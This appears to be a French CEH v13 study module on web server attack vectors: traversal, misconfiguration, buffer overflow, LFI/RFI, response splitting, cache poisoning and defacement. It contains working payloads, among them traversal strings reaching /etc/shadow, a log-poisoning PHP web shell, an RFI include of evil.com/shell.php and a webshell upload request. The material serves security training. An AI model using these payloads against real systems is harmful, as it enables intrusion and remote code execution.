# 🔴 Module 13 — Vecteurs d'Attaque sur les Serveurs Web

> **CEH v13 | EC-Council**  
> `#DirectoryTraversal` `#BufferOverflow` `#Misconfiguration` `#RFI` `#LFI` `#Defacement`

---

## 📌 Table des matières

1. [Directory / Path Traversal](#1-directory-traversal)
2. [Mauvaise Configuration (Misconfiguration)](#2-misconfiguration)
3. [Buffer Overflow](#3-buffer-overflow)
4. [RFI & LFI](#4-rfi--lfi)
5. [HTTP Response Splitting](#5-http-response-splitting)
6. [Web Cache Poisoning](#6-web-cache-poisoning)
7. [Defacement](#7-defacement)

---

## 1. Directory / Path Traversal

Accéder à des fichiers en dehors du répertoire web en utilisant des séquences `../`.

```
URL normale : https://site.com/files/document.pdf

Traversal :
https://site.com/files/../../../etc/passwd
https://site.com/files/....//....//etc/passwd  (bypass filtre basique)
https://site.com/files/%2e%2e%2f%2e%2e%2fetc%2fpasswd  (URL encodé)

Résultat si vulnérable :
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### Variantes de bypass

```
Filtre naïf qui supprime "../" :
  ....// → après suppression de "../" → ../  ✓
  ..\/   → slash inversé (Windows)
  %2e%2e%2f → URL encoding
  ..%c0%af  → Overlong UTF-8 (IIS historique)
  
Windows-specific :
  ..\..\..\..\windows\system32\drivers\etc\hosts
  C:\boot.ini
  C:\Windows\win.ini
```

---

## 2. Misconfiguration

Les mauvaises configurations sont la cause #1 de vulnérabilités des serveurs web.

### 2.1 Directory Listing activé

```
GET /backup/ HTTP/1.1

Réponse vulnérable :
Index of /backup
[DIR] 2024-01-15  config/
[FILE] 2024-01-10  database_backup.sql   ← Fuite de données !
[FILE] 2024-01-08  passwords.txt         ← Credentials !
[FILE] 2023-12-01  source_code.zip       ← Code source !

Protection :
Apache : Options -Indexes
Nginx  : autoindex off;
```

### 2.2 Pages par défaut

```
Pages par défaut révélatrices :
Apache : /server-status (stats serveur)
         /server-info (configuration)
IIS    : /iisstart.htm
         /_vti_bin/ (FrontPage Server Extensions)
Tomcat : /manager (console administration)
         /examples/ (exemples de code)
WebLogic: /console
phpMyAdmin : /phpmyadmin

Test : 
nikto -h http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

### 2.3 Fichiers de configuration exposés

```
Fichiers sensibles couramment exposés :
/config.php          → Credentials DB
/.env                → Variables d'environnement (API keys)
/.git/config         → Repository Git
/web.config          → Config IIS/ASP.NET
/wp-config.php       → Config WordPress
/robots.txt          → Peut révéler des chemins cachés
/sitemap.xml         → Structure du site
/backup.zip          → Backup du code source
```

### 2.4 Pages d'erreur verbose

```
Erreur verbose (mauvaise pratique) :
500 Internal Server Error
Fatal error: Uncaught PDOException: SQLSTATE[42000]: 
Syntax error or access violation: 1064 
You have an error in your SQL syntax near 'ORDER BY' at line 1
in /var/www/html/includes/db.php:42

→ Révèle : technologie (PDO/PHP), structure des requêtes SQL, chemin fichier
```

---

## 3. Buffer Overflow

Les serveurs web anciens sont parfois vulnérables aux dépassements de tampon.

```
Principe :
Un buffer (zone mémoire) de taille fixe reçoit plus de données que prévu
→ Écrase les données adjacentes en mémoire
→ Si l'adresse de retour est écrasée → Exécution de code arbitraire

Exemple historique : Apache chunked encoding overflow (CVE-2002-0392)
GET / HTTP/1.1
Transfer-Encoding: chunked
[Très grand nombre hexadécimal] ← Dépasse le buffer
...shellcode...

Exemple IIS : MS03-007 (WebDAV overflow)
Outils : Metasploit (modules buffer overflow web)
```

> ⚠️ **Rappel CEH** : Le buffer overflow sur serveur web est surtout **historique** pour l'examen. Les serveurs modernes utilisent des protections (ASLR, DEP, Stack Canaries).

---

## 4. RFI & LFI

### LFI — Local File Inclusion

Inclure des fichiers locaux du serveur dans le traitement PHP.

```php
// Code vulnérable :
include($_GET['page']);

// Exploitation :
http://site.com/index.php?page=/etc/passwd
http://site.com/index.php?page=../../../../etc/shadow

// Log poisoning via LFI :
1. Injecter du code PHP dans les logs Apache :
   curl -A "<?php system(\$_GET['cmd']); ?>" http://site.com/
   
2. Inclure le log via LFI :
   http://site.com/index.php?page=/var/log/apache2/access.log&cmd=whoami
   → Exécution de code PHP !
```

### RFI — Remote File Inclusion

```php
// Code vulnérable (allow_url_include = On en PHP) :
include($_GET['page']);

// Exploitation :
http://site.com/index.php?page=http://evil.com/shell.php

// Le serveur cible inclut et exécute le shell distant
// shell.php : <?php system($_GET['cmd']); ?>
```

---

## 5. HTTP Response Splitting

Injecter des headers HTTP dans une réponse via une entrée non validée.

```
Paramètre vulnérable : language
/redirect.php?lang=fr%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
                      ↑ CRLF injecté (%0d%0a)

Résultat : deux réponses HTTP sont générées
→ La seconde peut contenir du HTML malveillant
→ Cache poisoning (serveur proxy stocke la fausse réponse)
→ XSS (si proxy injecte le HTML dans la page)
```

---

## 6. Web Cache Poisoning

Empoisonner le cache HTTP/CDN pour que les victimes reçoivent un contenu malveillant.

```
Principe :
1. Identifier une requête dont la réponse est mise en cache
2. Injecter un header non-clé (non utilisé comme clé de cache)
   X-Forwarded-Host: evil.com  ← Non inclus dans la clé de cache
3. Le serveur utilise ce header pour générer des URLs dans la réponse
4. La réponse empoisonnée est mise en cache
5. Toutes les victimes qui demandent la même URL obtiennent
   la réponse empoisonnée (avec les URLs pointant vers evil.com)
```

---

## 7. Defacement

Le defacement consiste à modifier la page principale d'un site web.

```
Méthodes courantes :
1. Exploitation d'une vulnérabilité web (SQLi, RCE, file upload)
2. Accès FTP/SSH avec credentials volés/brute-forcés
3. CMS vulnérable (WordPress, Joomla avec plugin vulnérable)
4. Compromission de l'hébergeur

Exemple d'upload de webshell (souvent utilisé avant defacement) :
POST /upload.php
Content-Type: multipart/form-data

file=shell.php
<?php system($_GET['cmd']); ?>

→ Accès shell → modifier index.html/index.php
```

---

## 🧠 Points clés à retenir pour l'examen

- **Directory traversal** = `../` pour accéder à des fichiers hors du webroot
- **Directory listing** = dangereux → `Options -Indexes` sur Apache
- **LFI** = inclure des fichiers locaux (ex: /etc/passwd)
- **RFI** = inclure des fichiers distants (requiert `allow_url_include=On`)
- **Log poisoning** = technique pour transformer LFI en RCE
- **Nikto** = scanner de vulnérabilités web dédié à la détection de misconfiguration

---

*⬅️ [Concepts fondamentaux](./01_concepts_fondamentaux.md) | ➡️ [Techniques avancées](./03_techniques_avancees.md)*
